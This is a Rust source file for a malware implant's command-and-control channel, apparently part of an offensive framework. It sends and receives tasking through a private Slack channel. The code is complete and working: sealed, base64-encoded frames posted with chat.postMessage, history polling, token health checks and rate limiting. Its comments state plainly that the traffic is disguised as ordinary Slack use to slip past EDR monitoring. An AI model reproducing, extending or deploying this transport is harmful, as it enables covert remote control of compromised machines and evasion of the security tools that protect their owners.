//! Slack API C2 transport channel.
//!
//! BRC4 Mercury v2.5 killer feature: the implant posts encrypted frames as Slack
//! messages to a private channel, and the C2 server responds via the same
//! channel. To Slack it looks like a bot conversation. To EDR it looks like
//! normal Slack API traffic to `api.slack.com`.
//!
//! ## Protocol
//! - `send`: HMAC-seal the frame, Base64-encode the sealed blob, POST to
//!   `chat.postMessage` as message text. The HMAC tag is verified on recv so a
//!   third party posting into the channel can never inject a frame.
//! - `recv`: Poll `conversations.history`, filter out own bot messages,
//!   Base64-decode each candidate, verify its HMAC tag, skip anything that
//!   doesn't verify, return the first verified frame.
//! - `health_check`: Call `auth.test` to verify the token and measure latency.
//!
//! ## Frame integrity (CRITICAL-22)
//! Every relayed frame is wrapped as `tag(32) || len_be(4) || frame` before
//! base64 (see [`crate::traits::seal_frame`]). The MAC key is a per-channel
//! secret derived from the session key, so a workspace member, another bot, or
//! an admin who posts a base64 blob into the channel can't task the implant —
//! their blob has no valid tag and is skipped.
//!
//! ## Rate limiting
//! Slack enforces ~1 msg/sec per channel. We enforce a 1.2 s inter-message gap to
//! stay under the limit without triggering 429s.

use std::time::{Duration, Instant};

use base64::Engine as _;
use serde::Deserialize;

use crate::traits::{open_frame, seal_frame, Transport, TransportError};

// ---- Slack API JSON shapes ------------------------------------------------

#[derive(Debug, Deserialize)]
struct HistoryPayload {
    #[serde(default)]
    messages: Vec<SlackMessage>,
}

#[derive(Debug, Deserialize)]
struct SlackMessage {
    ts: String,
    #[serde(default)]
    text: String,
    #[serde(default)]
    user: Option<String>,
}

#[derive(Debug, Deserialize)]
struct PostMessagePayload {
    #[serde(default)]
    ts: Option<String>,
}

// ---- Transport ------------------------------------------------------------

const SLACK_API_BASE: &str = "https://slack.com/api/";
const SEND_COOLDOWN_MS: u64 = 1200;
const POLL_INTERVAL_MS: u64 = 500;
const MAX_FRAME: usize = 40 * 1024;

/// Slack API C2 transport channel.
///
/// Uses a Slack Bot User OAuth Token (`xoxb-...`) to post and read messages
/// in a private channel. The implant and C2 server communicate by exchanging
/// Base64-encoded frames as message text.
pub struct SlackTransport {
    bot_token: String,
    channel_id: String,
    /// HMAC-SHA256 key used to seal/verify relayed frames (CRITICAL-22).
    /// Derived per-channel from the session key so a third party posting
    /// into the channel cannot forge a valid tag.
    channel_secret: [u8; 32],
    bot_user_id: Option<String>,
    agent: ureq::Agent,
    last_ts: Option<String>,
    next_send_after: Option<Instant>,
}

impl SlackTransport {
    /// Create a new Slack transport channel.
    ///
    /// `bot_token` must be a Slack Bot User OAuth Token (`xoxb-...`).
    /// `channel_id` is the Slack channel ID (e.g. `C0123456789`) — not the
    /// channel name. The bot must be invited to the channel with `chat:write`
    /// and `channels:history` scopes.
    ///
    /// `session_key` is the 32-byte shared secret the protocol layer already
    /// holds; it is domain-separated into a per-channel HMAC key
    /// (see [`crate::traits::derive_channel_key`]) so this channel's tags are
    /// not reusable on any other transport. REQUIRED (CRITICAL-22): without it
    /// any workspace member or bot could post a base64 blob and inject a C2
    /// frame, because the sender check was only `user_id != our bot`.
    pub fn new(bot_token: String, channel_id: String, session_key: &[u8; 32]) -> Self {
        Self {
            bot_token,
            channel_id,
            channel_secret: crate::traits::derive_channel_key(session_key, b"slack"),
            bot_user_id: None,
            agent: ureq::AgentBuilder::new()
                .timeout(Duration::from_secs(10))
                .build(),
            last_ts: None,
            next_send_after: None,
        }
    }

    /// Test-only constructor with a fixed all-zero session key, so unit tests
    /// of the plumbing (frame size, name, rate-limit timer) don't need a real
    /// secret. The channel_secret it derives is still a real HMAC key, just not
    /// one an attacker could guess outside this test binary.
    #[cfg(test)]
    fn new_for_test(bot_token: String, channel_id: String) -> Self {
        Self::new(bot_token, channel_id, &[0u8; 32])
    }

    // -- internal helpers ---------------------------------------------------

    fn auth_header(&self) -> String {
        format!("Bearer {}", self.bot_token)
    }

    /// POST to a Slack API method with a JSON body. Returns the raw response on
    /// success, or a `TransportError` on failure.
    fn slack_post(
        &self,
        method: &str,
        body: serde_json::Value,
    ) -> Result<ureq::Response, TransportError> {
        let url = format!("{SLACK_API_BASE}{method}");
        let resp = self
            .agent
            .post(&url)
            .set("Authorization", &self.auth_header())
            .set("Content-Type", "application/json; charset=utf-8")
            .send_json(body)
            .map_err(|e| self.classify_ureq_error(e))?;
        Ok(resp)
    }

    /// GET a Slack API method with query params. Returns the raw response.
    fn slack_get(
        &self,
        method: &str,
        params: &[(&str, &str)],
    ) -> Result<ureq::Response, TransportError> {
        let url = format!("{SLACK_API_BASE}{method}");
        let mut req = self
            .agent
            .get(&url)
            .set("Authorization", &self.auth_header());
        for (k, v) in params {
            req = req.query(k, v);
        }
        let resp = req.call().map_err(|e| self.classify_ureq_error(e))?;
        Ok(resp)
    }

    /// Classify a `ureq::Error` into a `TransportError`.
    fn classify_ureq_error(&self, e: ureq::Error) -> TransportError {
        match &e {
            ureq::Error::Status(429, _) => TransportError::Transient("Slack rate limited (429)"),
            ureq::Error::Status(401, _) => TransportError::Dead("Slack token invalid (401)"),
            ureq::Error::Status(403, _) => {
                TransportError::Dead("Slack token lacks required scopes (403)")
            }
            ureq::Error::Status(code, _) if *code >= 500 => {
                TransportError::Transient("Slack server error (5xx)")
            }
            ureq::Error::Transport(_) => {
                TransportError::Transient("Slack transport error (network)")
            }
            _ => TransportError::Transient("Slack API error"),
        }
    }

    /// Resolve the bot user ID by calling `auth.test`. Used during `init()`.
    fn resolve_bot_user_id(&mut self) -> Result<(), TransportError> {
        let resp: serde_json::Value = self
            .agent
            .post(&format!("{SLACK_API_BASE}auth.test"))
            .set("Authorization", &self.auth_header())
            .set("Content-Type", "application/json; charset=utf-8")
            .send_json(serde_json::json!({}))
            .map_err(|e| self.classify_ureq_error(e))?
            .into_json()
            .map_err(|_| TransportError::Transient("Slack auth.test parse error"))?;

        let ok = resp["ok"].as_bool().unwrap_or(false);
        if !ok {
            let err = resp["error"].as_str().unwrap_or("unknown");
            return Err(match err {
                "invalid_auth" | "token_revoked" | "account_inactive" => {
                    TransportError::Dead("Slack token invalid")
                }
                _ => TransportError::Transient("Slack auth.test failed"),
            });
        }

        self.bot_user_id = resp["user_id"].as_str().map(|s| s.to_owned());
        Ok(())
    }

    /// Poll Slack history for new messages. Returns `Ok(Some(frame))` if a new
    /// C2 message was found, `Ok(None)` if nothing new, or `Err` on failure.
    fn poll_history(&mut self) -> Result<Option<Vec<u8>>, TransportError> {
        let mut params = vec![("channel", self.channel_id.as_str()), ("limit", "5")];
        let oldest_str;
        if let Some(ref ts) = self.last_ts {
            oldest_str = ts.clone();
            params.push(("oldest", &oldest_str));
        }

        let resp = self.slack_get("conversations.history", &params)?;
        let payload: HistoryPayload = resp
            .into_json()
            .map_err(|_| TransportError::Transient("Slack history parse error"))?;

        // Find the first message that is NOT from our own bot AND carries a
        // valid HMAC tag. Any message whose tag doesn't verify (a human, another
        // bot, an admin pasting a base64 blob) is skipped without being decoded —
        // CRITICAL-22: sender validation was only `user_id != our bot`.
        for msg in &payload.messages {
            let is_own = self
                .bot_user_id
                .as_deref()
                .is_some_and(|uid| msg.user.as_deref() == Some(uid));
            if is_own || msg.text.is_empty() {
                continue;
            }

            // Decode the candidate blob. Bad base64 isn't an error worth killing
            // the channel for — it's just a non-C2 message we skip.
            let Ok(blob) = base64::engine::general_purpose::STANDARD.decode(&msg.text) else {
                continue;
            };

            // Verify the HMAC tag before treating the payload as a frame. A
            // failed tag is a skip, not an error: legitimate non-C2 messages in
            // the channel should not take the transport down.
            let Ok(frame) = open_frame(&self.channel_secret, &blob) else {
                continue;
            };

            // Advance the cursor only once we've accepted a frame.
            self.last_ts = Some(msg.ts.clone());
            return Ok(Some(frame));
        }

        // Update cursor to the latest message timestamp even if we didn't find
        // a C2 message, so we don't re-scan the same messages on the next poll.
        if let Some(latest) = payload.messages.first() {
            self.last_ts = Some(latest.ts.clone());
        }

        Ok(None)
    }

    /// Enforce send rate limit (1.2 s between messages).
    fn enforce_rate_limit(&mut self) {
        if let Some(next) = self.next_send_after {
            let now = Instant::now();
            if now < next {
                std::thread::sleep(next - now);
            }
        }
    }
}

impl Transport for SlackTransport {
    fn send(&mut self, frame: &[u8]) -> Result<(), TransportError> {
        if frame.len() > MAX_FRAME {
            return Err(TransportError::PayloadTooLarge(frame.len()));
        }

        self.enforce_rate_limit();

        // Seal the frame with an HMAC tag + length prefix before base64 so the
        // receiver can reject anything it didn't seal (CRITICAL-22).
        let sealed = seal_frame(&self.channel_secret, frame);
        let text = base64::engine::general_purpose::STANDARD.encode(&sealed);
        let body = serde_json::json!({
            "channel": self.channel_id,
            "text": text,
        });

        let resp = self.slack_post("chat.postMessage", body)?;
        let payload: PostMessagePayload = resp
            .into_json()
            .map_err(|_| TransportError::Transient("Slack postMessage parse error"))?;

        if let Some(ts) = payload.ts {
            self.last_ts = Some(ts);
        }

        self.next_send_after = Some(Instant::now() + Duration::from_millis(SEND_COOLDOWN_MS));
        Ok(())
    }

    fn recv(&mut self, timeout_ms: u32) -> Result<Vec<u8>, TransportError> {
        if self.bot_user_id.is_none() {
            // Lazy-init: resolve bot user ID on first recv if init() wasn't called.
            self.resolve_bot_user_id()?;
        }

        let deadline = Instant::now() + Duration::from_millis(timeout_ms as u64);

        loop {
            match self.poll_history() {
                Ok(Some(frame)) => return Ok(frame),
                Ok(None) => {
                    if Instant::now() >= deadline {
                        return Err(TransportError::Timeout);
                    }
                    std::thread::sleep(Duration::from_millis(POLL_INTERVAL_MS));
                }
                Err(e) => return Err(e),
            }
        }
    }

    fn health_check(&self) -> Option<u64> {
        let start = Instant::now();
        let resp = self
            .agent
            .post(&format!("{SLACK_API_BASE}auth.test"))
            .set("Authorization", &self.auth_header())
            .set("Content-Type", "application/json; charset=utf-8")
            .send_json(serde_json::json!({}));

        match resp {
            Ok(r) => match r.into_json::<serde_json::Value>() {
                Ok(v) if v["ok"].as_bool().unwrap_or(false) => {
                    Some(start.elapsed().as_millis() as u64)
                }
                _ => None,
            },
            Err(_) => None,
        }
    }

    fn name(&self) -> &'static str {
        "slack-api"
    }

    fn max_frame_size(&self) -> usize {
        MAX_FRAME
    }

    fn init(&mut self) -> Result<(), TransportError> {
        self.resolve_bot_user_id()
    }
}

// ---- Tests ----------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn max_frame_size_is_40k() {
        let t = SlackTransport::new_for_test("xoxb-test".into(), "C000".into());
        assert_eq!(t.max_frame_size(), 40 * 1024);
    }

    #[test]
    fn name_is_slack_api() {
        let t = SlackTransport::new_for_test("xoxb-test".into(), "C000".into());
        assert_eq!(t.name(), "slack-api");
    }

    #[test]
    fn oversized_frame_rejected() {
        let mut t = SlackTransport::new_for_test("xoxb-test".into(), "C000".into());
        let big = vec![0u8; 41 * 1024];
        match t.send(&big) {
            Err(TransportError::PayloadTooLarge(n)) => assert_eq!(n, 41 * 1024),
            other => panic!("expected PayloadTooLarge, got {other:?}"),
        }
    }

    #[test]
    fn send_cooldown_advances_timer() {
        let mut t = SlackTransport::new_for_test("xoxb-test".into(), "C000".into());
        assert!(t.next_send_after.is_none());
        t.enforce_rate_limit();
        // No-op when next_send_after is None.
        t.next_send_after = Some(Instant::now() + Duration::from_millis(SEND_COOLDOWN_MS));
        let before = Instant::now();
        t.enforce_rate_limit();
        assert!(before.elapsed() >= Duration::from_millis(SEND_COOLDOWN_MS));
    }

    // ---- CRITICAL-22 injection resistance --------------------------------
    //
    // These tests exercise the framing directly rather than `poll_history`
    // (which needs a live Slack API). They prove the property CRITICAL-22 is
    // about: a message whose tag doesn't verify is never decoded as a frame,
    // whether it came from a human, another bot, or a workspace admin.

    fn sealed_msg_text(t: &SlackTransport, frame: &[u8]) -> String {
        // Mirror exactly what `send` puts on the wire.
        let sealed = seal_frame(&t.channel_secret, frame);
        base64::engine::general_purpose::STANDARD.encode(&sealed)
    }

    #[test]
    fn sealed_frame_roundtrips_through_framing() {
        // The legitimate path: a frame this transport sealed verifies and
        // decodes back to the original bytes.
        let t = SlackTransport::new_for_test("xoxb-test".into(), "C000".into());
        let frame = b"implant-task-frame-bytes";
        let text = sealed_msg_text(&t, frame);

        let blob = base64::engine::general_purpose::STANDARD
            .decode(&text)
            .expect("sealed message is valid base64");
        assert_eq!(open_frame(&t.channel_secret, &blob).unwrap(), frame);
    }

    #[test]
    fn attacker_plain_base64_blob_is_skipped() {
        // CRITICAL-22 regression: a third party pastes a plain base64 blob
        // (no HMAC tag) into the channel. It must NOT decode as a frame.
        let t = SlackTransport::new_for_test("xoxb-test".into(), "C000".into());
        let attacker_blob = base64::engine::general_purpose::STANDARD
            .encode(b"evil-implant-task-injected-by-human");
        let decoded = base64::engine::general_purpose::STANDARD
            .decode(&attacker_blob)
            .unwrap();
        assert_eq!(
            open_frame(&t.channel_secret, &decoded),
            Err(crate::traits::FrameIntegrityError)
        );
    }

    #[test]
    fn attacker_forged_tag_with_wrong_key_is_skipped() {
        // A sophisticated attacker forges a full tag+length+frame blob but
        // used a different key. The tag must not verify.
        let legit = SlackTransport::new_for_test("xoxb-test".into(), "C000".into());
        let attacker_key = crate::traits::derive_channel_key(&[0xFFu8; 32], b"slack");
        let forged = seal_frame(&attacker_key, b"evil-task");

        // Even a single-bit key difference makes the tag unverifiable.
        assert_eq!(
            open_frame(&legit.channel_secret, &forged),
            Err(crate::traits::FrameIntegrityError)
        );
    }

    #[test]
    fn wrong_channel_label_tag_does_not_verify() {
        // A tag sealed under the MCP channel label is not accepted by the
        // Slack channel — domain separation between relay channels.
        let session_key = [0x42u8; 32];
        let slack = SlackTransport::new("xoxb-test".into(), "C000".into(), &session_key);
        let mcp_key = crate::traits::derive_channel_key(&session_key, b"mcp");
        let cross_blob = seal_frame(&mcp_key, b"x");
        assert_eq!(
            open_frame(&slack.channel_secret, &cross_blob),
            Err(crate::traits::FrameIntegrityError)
        );
    }
}
